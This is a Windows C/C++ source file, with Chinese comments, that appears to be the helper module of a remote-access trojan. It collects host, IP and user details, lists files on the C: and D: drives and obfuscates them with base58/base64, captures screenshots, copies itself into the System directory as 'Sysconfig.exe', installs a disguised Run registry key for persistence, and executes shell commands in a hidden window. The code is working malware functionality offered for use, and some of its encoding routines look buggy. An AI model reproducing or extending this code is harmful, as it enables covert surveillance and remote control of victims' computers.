#include "tcpSocke.h"

bool init_Socket()
{
	WSADATA data;
	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ：Windows异步套接字
	{
		err("WSAStartup");
		return false;
	}
	return true;
}

bool close_Socket()
{
	if (WSACleanup() != 0)
	{
		err("WSACleanup");
		return false;
	}
	return true;
}

SOCKET CreatServerScoket()
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = ADDR_ANY;//inet_addr("127.0.0.1")

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		err("bind");
		return false;
	}
	//3、监听电话：
	listen(fd, 10);
	return fd;
}

SOCKET CreatClientScoket(const char* ip)
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	//3、与服务器建立连接
	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		err("connect");
		return false;
	}
	return fd;
}

bool getmessage(struct PC_Message* messages)
{
	DWORD NameLen = BUFSIZ;
	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
	{
		err("PCName");
	}
	struct hostent* p = gethostbyname(messages->PCName);
	if (p == 0)
	{
		err("host and IP");
	}
	else
	{
		//获取本机计算机名
		for (int i = 0; p->h_addr_list[i] != 0; i++)//本机IP
		{
			struct in_addr in;
			memcpy(&in, p->h_addr_list[i], sizeof(struct in_addr));
			strcpy(messages->IP, inet_ntoa(in));
		}
	}
	if (!GetUserName(messages->UserName, &NameLen))
	{
		err("UserName");
	}
	return true;
}

bool TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;
	//获取字节长度   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//将tchar值赋给_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
	return true;
}

bool HeartBeat(SOCKET fd)
{
	char buf[] = "keep alive";
	encode(buf);
	while (true)
	{
		//send(fd, buf, sizeof(buf), 0);
		cout << buf << endl;
		Sleep(5000);
	}
	return false;
}

void base58encode(char plainText[])
{
	int i;
	long long sum = 0;
	int len = strlen(plainText) * 138 / 100 + 1;// len * log(2)256 / log(2)(58) + 1
	char base58Table[59] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	char* encryption = (char*)malloc(len * sizeof(char));
	int index = 0;
	memset(encryption, 0, len * sizeof(char));
	while (index < strlen(plainText)) {
		int each = plainText[index];
		for (i = len - 1; ; i--) {
			each += encryption[i] * 256;
			encryption[i] = each % 58;
			each /= 58;
			if (0 == each)
				break;
		}
		i = 0;//输出
		index++;
	}
	i = 0;
	while (!encryption[i])
		i++;
	for (; i <= len - 1; i++)
	{
		plainText[i] = base58Table[encryption[i]];
	}
}

bool base58decode(unsigned char* src)  // 解码
{
	static char b58n[] =
	{
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1,  0,  1,  2,  3,  4,  5,  6,  7,  8, -1, -1, -1, -1, -1, -1,
		-1,  9, 10, 11, 12, 13, 14, 15, 16, -1, 17, 18, 19, 20, 21, -1,
		22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, -1, -1, -1, -1, -1,
		-1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, -1, 44, 45, 46,
		47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
	};
	size_t len = strlen((char*)src);
	size_t rlen = (len / 4 + 1) * 3;
	unsigned char* ret = (unsigned char*)malloc(rlen);
	unsigned char* rptr = ret + rlen;
	size_t i;
	unsigned char* ptr;
	for (i = 0; i < len; i++)
	{
		char rest = b58n[src[i]];
		if (rest < 0)
		{
			free(ret);
			return NULL;
		}
		for (ptr = ret + rlen - 1; ptr >= rptr; ptr--)
		{
			unsigned int c = rest + *ptr * 58;
			*ptr = c % 256;
			rest = c / 256;
		}
		if (rest > 0)
		{
			rptr--;
			if (rptr < ret)
			{
				free(ret);
				return NULL;
			}
			*rptr = rest;
		}
	}
	for (i = 0; i < ret + rlen - rptr; i++)
		ret[i] = rptr[i];
	ret[i] = 0;
	memcpy(src, ret, strlen((char*)src));
	return true;
}

void base64encode(char* str)
{
	long len;
	long str_len;
	char* res;
	int i, j;
	//定义base64编码表  
	char* base64_table = (char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	//计算经过base64编码后的字符串长度  
	str_len = strlen(str);
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (char*)malloc(sizeof(unsigned char) * len + 1);
	res[len] = '\0';

	//以3个8位字符为一组进行编码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
	}

	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	strcpy(str, res);
}

void base64decode(char* str)
{
	int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,62,0,0,0,
			 63,52,53,54,55,56,57,58,
			 59,60,61,0,0,0,0,0,0,0,0,
			 1,2,3,4,5,6,7,8,9,10,11,12,
			 13,14,15,16,17,18,19,20,21,
			 22,23,24,25,0,0,0,0,0,0,26,
			 27,28,29,30,31,32,33,34,35,
			 36,37,38,39,40,41,42,43,44,
			 45,46,47,48,49,50,51
	};
	long len;
	long str_len;
	char* res;
	int i, j;

	//计算解码后的字符串长度  
	len = strlen(str);
	//判断编码后的字符串后是否有=  
	if (strstr(str, "=="))
		str_len = len / 4 * 3 - 2;
	else if (strstr(str, "="))
		str_len = len / 4 * 3 - 1;
	else
		str_len = len / 4 * 3;

	res = (char*)malloc(sizeof(char) * str_len + 1);
	res[str_len] = '\0';

	//以4个字符为一位进行解码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[j] = ((char)table[str[i]]) << 2 | (((char)table[str[i + 1]]) >> 4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
		res[j + 1] = (((char)table[str[i + 1]]) << 4) | (((char)table[str[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
		res[j + 2] = (((char)table[str[i + 2]]) << 6) | ((char)table[str[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
	}

	strcpy(str, res);

}

void encode(char* text)
{
	base58encode(text);
	base64encode(text);
}

void decode(char* pwd)
{
	base58decode((unsigned char*)pwd);
	base64decode(pwd);
}

void ScreenShot(LPCTSTR s)
{
	HDC hdcSrc = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);//像素
	int nWidth = GetDeviceCaps(hdcSrc, HORZRES);//宽
	int nHeight = GetDeviceCaps(hdcSrc, VERTRES);//高
	CImage image;
	image.Create(nWidth, nHeight, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);//用于从原设备中复制位图到目标设备
															//SRCCOPY 直接复制源设备区域到目标设备中
	ReleaseDC(NULL, hdcSrc);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
}

//void readSrc(SOCKET fd)
//{
//	// 1. 打开图片文件
//	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
//	// 2. 计算图片长度
//	Src.seekg(0, Src.end);  //将文件流指针定位到流的末尾
//	int length = Src.tellg();
//	Src.seekg(0, Src.beg);  //将文件流指针重新定位到流的开始
//	// 3. 创建内存缓存区
//	char* buffer = new char[length];
//	// 4. 读取图片
//	Src.read(buffer, length);
//	// 到此，图片已经成功的被读取到内存（buffer）中
//	cout << buffer << endl;
//	//send(fd, buffer, strlen(buffer), 0);
//	delete[] buffer;
//}

void GetFileName(char FileName[FileNameRow][FileNameCol])
{
	int i;
	for (i = 0; i < FileNameRow; i++)//对存储文件名的二维数组初始化
	{
		memset(FileName[i], 0, sizeof(FileName[i]));
	}
	intptr_t Handle;
	struct _finddata_t FileInfo;
	string p;
	string path1 = "C:";
	string path2 = "D:";
	Handle = _findfirst(p.assign(path1).append("\\*").c_str(), &FileInfo);
	strcpy(FileName[0], "C drive");//提示
	i = 1;
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	strcpy(FileName[i++], "D drive");//提示
	Handle = _findfirst(p.assign(path2).append("\\*").c_str(), &FileInfo);
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	_findclose(Handle);
	//加密
	char Zero[FileNameCol] = { 0 };
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			encode(FileName[i]);
		}
	}
}

int ComputerStart(char* pathName)
{
	HKEY hKey;
	DWORD result;

	//打开注册表
	result = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
		0,              // 保留参数必须填 0
		KEY_SET_VALUE,  // 打开权限，写入
		&hKey           // 打开之后的句柄
	);

	if (result != ERROR_SUCCESS)
	{
		return 0;
	}
	// 在注册表中设置(没有则会新增一个值)
	result = RegSetValueEx(
		hKey,
		(LPCWSTR)(CString)"SystemConfig", // 键名
		0,                  // 保留参数必须填 0
		REG_SZ,             // 键值类型为字符串
		(const unsigned char*)pathName, // 字符串首地址
		strlen(pathName)        // 字符串长度
	);

	if (result != ERROR_SUCCESS) 
	{
		return 0;
	}
	//关闭注册表:
	RegCloseKey(hKey);
}

int copySelf(char* path)
{
	char fileName[MAX_PATH];
	char sysPath[MAX_PATH];
	//获得该文件的完整路径
	GetModuleFileName(NULL, (LPWSTR)fileName, sizeof(fileName));
	//取得System目录的完整路径名，写入sysPath
	GetSystemDirectory((LPWSTR)sysPath, sizeof(sysPath));
	sprintf(path, "%s\\Sysconfig.exe", sysPath);
	//将文件复制到系统目录
	CopyFile((LPWSTR)fileName, (LPWSTR)path, TRUE);
	return 0;
}

int CaptureImage(HWND hwnd, CHAR* dirPath, CHAR* filename)
{
	HANDLE hDIB;
	HANDLE hFile;
	DWORD dwBmpSize;
	DWORD dwSizeofDIB;
	DWORD dwBytesWritten;
	CHAR FilePath[MAX_PATH];
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	CHAR* lpbitmap;
	INT width = GetSystemMetrics(SM_CXSCREEN);  // 屏幕宽
	INT height = GetSystemMetrics(SM_CYSCREEN);  // 屏幕高
	HDC hdcScreen = GetDC(NULL); // 全屏幕DC
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // 创建兼容内存DC

	if (!hdcMemDC) goto done;

	// 通过窗口DC 创建一个兼容位图
	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);

	if (!hbmScreen) goto done;

	// 将位图块传送到兼容内存DC中
	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,    // 目的DC
		0, 0,        // 目的DC的 x,y 坐标
		width, height, // 目的 DC 的宽高
		hdcScreen,   // 来源DC
		0, 0,        // 来源DC的 x,y 坐标
		SRCCOPY))    // 粘贴方式
		goto done;

	// 获取位图信息并存放在 bmpScreen 中
	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	// handle 指向进程默认的堆
	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char*)GlobalLock(hDIB);

	// 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.
	GetDIBits(
		hdcScreen,  // 设备环境句柄
		hbmScreen,  // 位图句柄
		0,          // 指定检索的第一个扫描线
		(UINT)bmpScreen.bmHeight, // 指定检索的扫描线数
		lpbitmap,   // 指向用来检索位图数据的缓冲区的指针
		(BITMAPINFO*)&bi, // 该结构体保存位图的数据格式
		DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
	);


	wsprintf((LPWSTR)FilePath, (LPWSTR)"%s\\%s.bmp", dirPath, filename);

	// 创建一个文件来保存文件截图
	hFile = CreateFile(
		(LPWSTR)FilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

	// 文件大小
	bmfHeader.bfSize = dwSizeofDIB;

	// 位图的 bfType 必须是字符串 "BM"
	bmfHeader.bfType = 0x4D42; //BM

	dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	// 解锁堆内存并释放
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	// 关闭文件句柄
	CloseHandle(hFile);

	// 清理资源
done:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	Sleep(200);
	//bmptojpg24x("screen.bmp", "screen.jpg", 50);

	return 0;
}

int cmd(char* cmdStr, char* message)
{
	DWORD readByte = 0;
	char command[BUFSIZ * 2] = { 0 };
	char buf[BUFSIZ * 2] = { 0 }; //缓冲区

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // 启动配置信息
	PROCESS_INFORMATION pi; // 进程信息
	SECURITY_ATTRIBUTES sa; // 管道安全属性

	// 配置管道安全属性
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	// 创建匿名管道，管道句柄是可被继承的
	if (!CreatePipe(&hRead, &hWrite, &sa, BUFSIZ * 2)) {
		return 1;
	}

	// 配置 cmd 启动信息
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si); // 获取兼容大小
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头

	// 拼接 cmd 命令
	sprintf(command, "cmd.exe /c %s", cmdStr);

	// 创建子进程,运行命令,子进程是可继承的
	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(hRead);
		CloseHandle(hWrite);
		printf("error!");
		return 1;
	}
	CloseHandle(hWrite);

	//读取管道的read端,获得cmd输出
	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL)) 
	{
		strcat(message, buf);
		ZeroMemory(buf, BUFSIZ * 2);
	}
	CloseHandle(hRead);

	return 0;
}